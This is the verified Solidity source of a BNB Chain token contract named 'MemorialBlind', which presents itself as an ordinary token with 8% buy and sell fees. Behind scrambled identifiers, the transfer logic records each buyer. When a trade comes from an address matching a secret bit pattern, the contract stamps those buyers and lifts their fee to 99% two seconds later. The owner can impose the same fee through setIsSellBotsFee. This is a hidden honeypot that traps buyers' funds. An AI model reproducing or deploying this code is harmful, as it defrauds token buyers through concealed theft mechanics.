/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract MemorialBlind is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Memorial Blind ";
    string constant _symbol = "MemorialBlind";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private swapLimitTxMode;
    mapping(address => bool) private isSellBotsFee;
    mapping(address => bool) private launchedBurnReceiverTeam;
    mapping(address => bool) private botsSellReceiverIsExempt;
    mapping(address => uint256) private isReceiverBotsFee;
    mapping(uint256 => address) private teamBuyExemptLaunched;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private modeLaunchedLiquiditySellTeamBurnReceiver = 0;
    uint256 private burnLiquidityExemptMax = 8;

    //SELL FEES
    uint256 private exemptLiquidityTradingWallet = 0;
    uint256 private liquidityFeeBotsWallet = 8;

    uint256 private burnMinTeamLimitMax = burnLiquidityExemptMax + modeLaunchedLiquiditySellTeamBurnReceiver;
    uint256 private tradingBotsAutoMarketing = 100;

    address private minExemptSwapLaunched = (msg.sender); // auto-liq address
    address private buyAutoModeIs = (0xd0f8483a6d24a1971404Ee9BFFfFcAfA18e32630); // marketing address
    address private swapBotsAutoTxMin = DEAD;
    address private limitTradingSellBurn = DEAD;
    address private receiverModeBotsTx = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private receiverSwapSellAuto;
    uint256 private burnReceiverMaxSell;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private burnMaxTeamBots;
    uint256 private botsLiquidityModeIs;
    uint256 private limitReceiverMarketingSwap;
    uint256 private marketingSellTxLimit;
    uint256 private limitWalletLiquidityMinTeamFee;

    bool private feeLiquidityIsWalletSwapTrading = true;
    bool private botsSellReceiverIsExemptMode = true;
    bool private limitIsLaunchedTxLiquidityTeamSwap = true;
    bool private maxTradingLaunchedReceiverBurn = true;
    bool private marketingAutoBurnMaxLiquidityTradingIs = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private receiverTxBurnSell = _totalSupply / 1000; // 0.1%

    
    uint256 private liquidityTeamWalletFeeTxMode;
    bool private feeBurnLaunchedBotsReceiverSwapBuy;
    uint256 private receiverAutoIsSwap;
    uint256 private isBotsMarketingBurnFeeBuy;
    bool private feeSwapTxWallet;
    bool private marketingIsExemptSwapLiquidityMode;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        burnMaxTeamBots = true;

        swapLimitTxMode[msg.sender] = true;
        swapLimitTxMode[address(this)] = true;

        isSellBotsFee[msg.sender] = true;
        isSellBotsFee[0x0000000000000000000000000000000000000000] = true;
        isSellBotsFee[0x000000000000000000000000000000000000dEaD] = true;
        isSellBotsFee[address(this)] = true;

        launchedBurnReceiverTeam[msg.sender] = true;
        launchedBurnReceiverTeam[0x0000000000000000000000000000000000000000] = true;
        launchedBurnReceiverTeam[0x000000000000000000000000000000000000dEaD] = true;
        launchedBurnReceiverTeam[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return launchedTradingBuyMode(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return launchedTradingBuyMode(sender, recipient, amount);
    }

    function launchedTradingBuyMode(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = maxIsMinLiquidity(sender) || maxIsMinLiquidity(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                autoSwapIsBurnFeeSell();
            }
            if (!bLimitTxWalletValue) {
                receiverTeamMarketingTx(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return botsFeeTeamMinWallet(sender, recipient, amount);}

        if (!swapLimitTxMode[sender] && !swapLimitTxMode[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || launchedBurnReceiverTeam[sender] || launchedBurnReceiverTeam[recipient], "Max TX Limit has been triggered");

        if (launchedAutoTeamTx()) {liquidityMinBurnMax();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = txAutoSellLiquidity(sender) ? exemptSellLimitBuyMaxTx(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function botsFeeTeamMinWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txAutoSellLiquidity(address sender) internal view returns (bool) {
        return !isSellBotsFee[sender];
    }

    function walletTradingModeBuyMaxSwapLiquidity(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            burnMinTeamLimitMax = liquidityFeeBotsWallet + exemptLiquidityTradingWallet;
            return liquidityReceiverTxTeam(sender, burnMinTeamLimitMax);
        }
        if (!selling && sender == uniswapV2Pair) {
            burnMinTeamLimitMax = burnLiquidityExemptMax + modeLaunchedLiquiditySellTeamBurnReceiver;
            return burnMinTeamLimitMax;
        }
        return liquidityReceiverTxTeam(sender, burnMinTeamLimitMax);
    }

    function exemptSellLimitBuyMaxTx(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(walletTradingModeBuyMaxSwapLiquidity(sender, receiver == uniswapV2Pair)).div(tradingBotsAutoMarketing);

        if (botsSellReceiverIsExempt[sender] || botsSellReceiverIsExempt[receiver]) {
            feeAmount = amount.mul(99).div(tradingBotsAutoMarketing);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function maxIsMinLiquidity(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function liquidityReceiverTxTeam(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = isReceiverBotsFee[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function receiverTeamMarketingTx(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        teamBuyExemptLaunched[exemptLimitValue] = addr;
    }

    function autoSwapIsBurnFeeSell() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (isReceiverBotsFee[teamBuyExemptLaunched[i]] == 0) {
                    isReceiverBotsFee[teamBuyExemptLaunched[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(buyAutoModeIs).transfer(amountBNB * amountPercentage / 100);
    }

    function launchedAutoTeamTx() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    marketingAutoBurnMaxLiquidityTradingIs &&
    _balances[address(this)] >= receiverTxBurnSell;
    }

    function liquidityMinBurnMax() internal swapping {
        uint256 amountToLiquify = receiverTxBurnSell.mul(modeLaunchedLiquiditySellTeamBurnReceiver).div(burnMinTeamLimitMax).div(2);
        uint256 amountToSwap = receiverTxBurnSell.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = burnMinTeamLimitMax.sub(modeLaunchedLiquiditySellTeamBurnReceiver.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeLaunchedLiquiditySellTeamBurnReceiver).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(burnLiquidityExemptMax).div(totalETHFee);

        payable(buyAutoModeIs).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                minExemptSwapLaunched,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getExemptLiquidityTradingWallet() public view returns (uint256) {
        if (exemptLiquidityTradingWallet == tradingBotsAutoMarketing) {
            return tradingBotsAutoMarketing;
        }
        return exemptLiquidityTradingWallet;
    }
    function setExemptLiquidityTradingWallet(uint256 a0) public onlyOwner {
        if (exemptLiquidityTradingWallet != modeLaunchedLiquiditySellTeamBurnReceiver) {
            modeLaunchedLiquiditySellTeamBurnReceiver=a0;
        }
        exemptLiquidityTradingWallet=a0;
    }

    function getTradingBotsAutoMarketing() public view returns (uint256) {
        return tradingBotsAutoMarketing;
    }
    function setTradingBotsAutoMarketing(uint256 a0) public onlyOwner {
        tradingBotsAutoMarketing=a0;
    }

    function getMaxTradingLaunchedReceiverBurn() public view returns (bool) {
        if (maxTradingLaunchedReceiverBurn != botsSellReceiverIsExemptMode) {
            return botsSellReceiverIsExemptMode;
        }
        return maxTradingLaunchedReceiverBurn;
    }
    function setMaxTradingLaunchedReceiverBurn(bool a0) public onlyOwner {
        if (maxTradingLaunchedReceiverBurn != maxTradingLaunchedReceiverBurn) {
            maxTradingLaunchedReceiverBurn=a0;
        }
        if (maxTradingLaunchedReceiverBurn != marketingAutoBurnMaxLiquidityTradingIs) {
            marketingAutoBurnMaxLiquidityTradingIs=a0;
        }
        if (maxTradingLaunchedReceiverBurn != botsSellReceiverIsExemptMode) {
            botsSellReceiverIsExemptMode=a0;
        }
        maxTradingLaunchedReceiverBurn=a0;
    }

    function getLimitIsLaunchedTxLiquidityTeamSwap() public view returns (bool) {
        if (limitIsLaunchedTxLiquidityTeamSwap != marketingAutoBurnMaxLiquidityTradingIs) {
            return marketingAutoBurnMaxLiquidityTradingIs;
        }
        return limitIsLaunchedTxLiquidityTeamSwap;
    }
    function setLimitIsLaunchedTxLiquidityTeamSwap(bool a0) public onlyOwner {
        if (limitIsLaunchedTxLiquidityTeamSwap == feeLiquidityIsWalletSwapTrading) {
            feeLiquidityIsWalletSwapTrading=a0;
        }
        limitIsLaunchedTxLiquidityTeamSwap=a0;
    }

    function getTeamBuyExemptLaunched(uint256 a0) public view returns (address) {
        if (a0 == burnMinTeamLimitMax) {
            return swapBotsAutoTxMin;
        }
        if (a0 == tradingBotsAutoMarketing) {
            return receiverModeBotsTx;
        }
            return teamBuyExemptLaunched[a0];
    }
    function setTeamBuyExemptLaunched(uint256 a0,address a1) public onlyOwner {
        teamBuyExemptLaunched[a0]=a1;
    }

    function getBurnMinTeamLimitMax() public view returns (uint256) {
        if (burnMinTeamLimitMax == exemptLiquidityTradingWallet) {
            return exemptLiquidityTradingWallet;
        }
        if (burnMinTeamLimitMax != burnMinTeamLimitMax) {
            return burnMinTeamLimitMax;
        }
        return burnMinTeamLimitMax;
    }
    function setBurnMinTeamLimitMax(uint256 a0) public onlyOwner {
        if (burnMinTeamLimitMax == burnMinTeamLimitMax) {
            burnMinTeamLimitMax=a0;
        }
        if (burnMinTeamLimitMax != burnLiquidityExemptMax) {
            burnLiquidityExemptMax=a0;
        }
        burnMinTeamLimitMax=a0;
    }

    function getIsSellBotsFee(address a0) public view returns (bool) {
            return isSellBotsFee[a0];
    }
    function setIsSellBotsFee(address a0,bool a1) public onlyOwner {
        if (isSellBotsFee[a0] == botsSellReceiverIsExempt[a0]) {
           botsSellReceiverIsExempt[a0]=a1;
        }
        isSellBotsFee[a0]=a1;
    }

    function getFeeLiquidityIsWalletSwapTrading() public view returns (bool) {
        if (feeLiquidityIsWalletSwapTrading != botsSellReceiverIsExemptMode) {
            return botsSellReceiverIsExemptMode;
        }
        return feeLiquidityIsWalletSwapTrading;
    }
    function setFeeLiquidityIsWalletSwapTrading(bool a0) public onlyOwner {
        if (feeLiquidityIsWalletSwapTrading == maxTradingLaunchedReceiverBurn) {
            maxTradingLaunchedReceiverBurn=a0;
        }
        if (feeLiquidityIsWalletSwapTrading != marketingAutoBurnMaxLiquidityTradingIs) {
            marketingAutoBurnMaxLiquidityTradingIs=a0;
        }
        feeLiquidityIsWalletSwapTrading=a0;
    }

    function getBotsSellReceiverIsExemptMode() public view returns (bool) {
        return botsSellReceiverIsExemptMode;
    }
    function setBotsSellReceiverIsExemptMode(bool a0) public onlyOwner {
        if (botsSellReceiverIsExemptMode != limitIsLaunchedTxLiquidityTeamSwap) {
            limitIsLaunchedTxLiquidityTeamSwap=a0;
        }
        botsSellReceiverIsExemptMode=a0;
    }

    function getLimitTradingSellBurn() public view returns (address) {
        if (limitTradingSellBurn == receiverModeBotsTx) {
            return receiverModeBotsTx;
        }
        if (limitTradingSellBurn != swapBotsAutoTxMin) {
            return swapBotsAutoTxMin;
        }
        if (limitTradingSellBurn == minExemptSwapLaunched) {
            return minExemptSwapLaunched;
        }
        return limitTradingSellBurn;
    }
    function setLimitTradingSellBurn(address a0) public onlyOwner {
        limitTradingSellBurn=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}